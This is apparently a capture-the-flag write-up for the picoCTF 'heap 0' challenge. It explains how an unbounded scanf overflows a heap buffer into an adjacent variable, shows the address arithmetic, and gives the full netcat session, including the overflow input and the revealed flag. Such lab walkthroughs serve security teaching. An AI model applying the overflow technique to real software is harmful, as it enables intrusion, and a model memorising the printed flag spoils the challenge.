Today’s challenge, “Binary Exploitation,” explores heap overflow, a lesser-known but powerful attack vector that targets dynamically allocated memory rather than the stack. This type of vulnerability can lead to severe security breaches, including arbitrary code execution or sensitive data exposure. The challenge description:

Are overflows just a stack concern?

The challenge provided three essential resources: a binary file, its source code, and a connection to a remote instance. My first step was to examine the provided files. While the binary file contained the compiled code, the source code revealed the program’s logic, which is crucial for und

Upon examining the source code, I noticed that the program allocates two variables, input_data and safe_var, on the heap. The input_data is initialized with "pico" and the safe_var with "bico." The key to winning this challenge is to modify the content of safe_var, which triggers the program to print the flag stored in a file.

Zoom image will be displayed

Here’s a snippet from the source code:

void check_win() {
    if (strcmp(safe_var, "bico") != 0) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flag for you :(\n");
        fflush(stdout);
    }
}
To modify the content of safe_var, I focused on the write_buffer() function, which allows us to write input directly to input_data:\

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}
The scanf function here is the key of the exploit. Since scanf lacks boundary checks, it can overflow the input_data buffer, allowing us to overwrite adjacent memory locations, including the safe_var.

To determine the exact string length required to overwrite safe_var, I analyzed the memory layout using the program’s “print heap” function, which revealed the heap addresses of input_data and safe_var.

Heap State:

[*] 0x63c3882552b0 -> pico

[*] 0x63c3882552d0 -> bico

These addresses are in hexadecimal format, so to find the difference between them (i.e., the distance in bytes), we perform a simple subtraction:

The address of input_data is 0x63c3882552b0.
The address of safe_var is 0x63c3882552d0.
Subtracting these two addresses:

0x63c3882552d0 - 0x63c3882552b0 = 0x20

Zoom image will be displayed

0x20 to decimal
I tested different inputs, I found that inputting a string like “abcdef” doesn’t work because it only writes 6 bytes (which isn’t enough to overflow). To successfully overwrite safe_var, the string needs to be sufficiently long, at least 33 bytes.

So, inputting a string of 33 characters or more will allow us to overwrite the “bico” in safe_var with something else, causing the check_win() function to print the flag.

┌──(kali㉿kali)-[~/Desktop/picoCTF/Binary Exploitation/heap 0]
└─$ nc tethys.picoctf.net 60704

Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x622c750042b0  ->   pico
+-------------+----------------+
[*]   0x622c750042d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567891911

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x622c750042b0  ->   ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567891911
+-------------+----------------+
[*]   0x622c750042d0  ->   7891911
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 3


Take a look at my variable: safe_var = 7891911


1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{my_first_heap_overflow_1ad0e1a6}
